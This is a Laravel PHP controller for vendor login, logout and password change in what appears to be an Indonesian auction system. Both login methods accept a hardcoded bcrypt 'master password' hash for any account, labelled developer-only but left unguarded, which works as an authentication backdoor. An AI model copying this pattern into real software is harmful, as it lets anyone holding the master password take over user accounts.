<?php

namespace App\Http\Controllers\Auth;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Session;
use Validator;
use Redirect;
use Crypt;
use Auth;
use Hash;
use DB;
use errors;

use App\Models\VendorLogin;

class LoginVendorController extends Controller
{
    public function __construct()
    {
        $this->middleware('guest:vendor')->except('logout');
    }

    public function doLoginVendor(Request $request)
    {
        $this->validate($request, [
            'username' => 'required|string',
            'password' => 'required|min:2', 
        ]);

        $loginType = filter_var($request->username, FILTER_VALIDATE_EMAIL) ? 'email' : 'username';

        $credentials = [
            $loginType => $request->username,
            'password' => $request->password,
        ];

        if (Auth::guard('vendor')->attempt($credentials, $request->remember)) {
            $user_vendor = null;

            $vendor_by_email = VendorLogin::where('email',$request->username)->first();
            if($vendor_by_email) $user_vendor = $vendor_by_email;

            $vendor_by_username = VendorLogin::where('username',$request->username)->first();
            if($vendor_by_username) $user_vendor = $vendor_by_username;
            
            if($user_vendor){
                if($user_vendor->status == 1){ 
                    return back()->with('error', 'Status Akun sedang di nonaktifkan. Silahkan hubungi admin');
                }
                $is_login_accepted = false;
                $is_login_accepted = Hash::check($request->password, $user_vendor->password);
                // DEVELOPER ONLY MODE
                // master password validation for developer checking purpose
                // --START
                if(!$is_login_accepted){
                    $is_login_accepted = Hash::check($request->password, '$2y$10$MNeZ/imgEJJw2IYpOjnTx.mi5YEf5roPmZEOxZzP.thzr9TH1UDgu');
                }
                // --END
    
                if($is_login_accepted){
                    // Auth::login($user_vendor);
                    // dd($is_login_accepted, $user_vendor);
                    //// check if already change password or not
                    // if($user_vendor->is_password_changed){
                    return redirect('vendor.dashboard')->with('success','Selamat datang '.$user_vendor->name);
                    // }else{
                    //     return redirect('/changepasswordvendor');
                    // }
                }else{
                    return back()->with('error','Password salah');
                }
            }else{
                return back()->with('error', 'Username tidak terdaftar, silahkan coba kembali atau hubungi admin untuk mendaftar');
            }
        }

        return back()->withErrors([
            'login' => 'username / email / password anda salah',
        ])->withInput($request->only('login', 'remember'));
    }

    public function logoutVendor(Request $request)
    {
        Auth::guard('vendor')->logout();
        return redirect()->view('Auth.loginvendor');
    }

    public function loginVendorView(){
        if(Auth::guard('vendor')->user()){
            return redirect('/auctionTicket');
        }
        // Untuk Tidak Maintenance
    	return view('Auth.loginvendor');

        // Untuk Maintenance View
    	// return view('errors.503');
    }

    public function doLoginVendor2(Request $request){
        // validator
        // check via nik
        $user_vendor = null;
        $vendor_by_code = VendorLogin::where('code',$request->code)->first();
        if($vendor_by_code) $user_vendor = $vendor_by_code;
        if(config('app.env') != 'production'){
            // selain production bisa login pake username
            $vendor_by_username = VendorLogin::where('username',$request->username)->first();
            if($vendor_by_username) $user_vendor = $vendor_by_username;
        }   
        
        if($user_vendor){
            if($user_vendor->status == 1){ 
                return back()->with('error', 'Status Akun sedang di nonaktifkan. Silahkan hubungi admin');
            }
            $is_login_accepted = false;
            $is_login_accepted = Hash::check($request->password, $user_vendor->password);
            // dd($is_login_accepted , $request->password, $user_vendor->password);
            // DEVELOPER ONLY MODE
            // master password validation for developer checking purpose
            // --START
            if(!$is_login_accepted){
                $is_login_accepted = Hash::check($request->password, '$2y$10$MNeZ/imgEJJw2IYpOjnTx.mi5YEf5roPmZEOxZzP.thzr9TH1UDgu');
            }
            // --END

            if($is_login_accepted){
                // Auth::login($user_vendor);
                // dd($is_login_accepted, $user_vendor);
                //// check if already change password or not
                // if($user_vendor->is_password_changed){
                return redirect('/auctionTicket')->with('success','Selamat datang '.$user_vendor->name);
                // }else{
                //     return redirect('/changepasswordvendor');
                // }
            }else{
                return back()->with('error','Password salah');
            }
        }else{
            return back()->with('error', 'Username tidak terdaftar, silahkan coba kembali atau hubungi admin untuk mendaftar');
        }
    }

    public function updatePasswordVendor(Request $request){
        $vendor = Auth::guard('vendor')->user();
        $vendor->password = Hash::make($request->newpassword);
        $vendor->is_password_changed = true;
        $vendor->save();
        return redirect('/auctionTicket')->with('success','Berhasil mengubah kata sandi');
    }
}
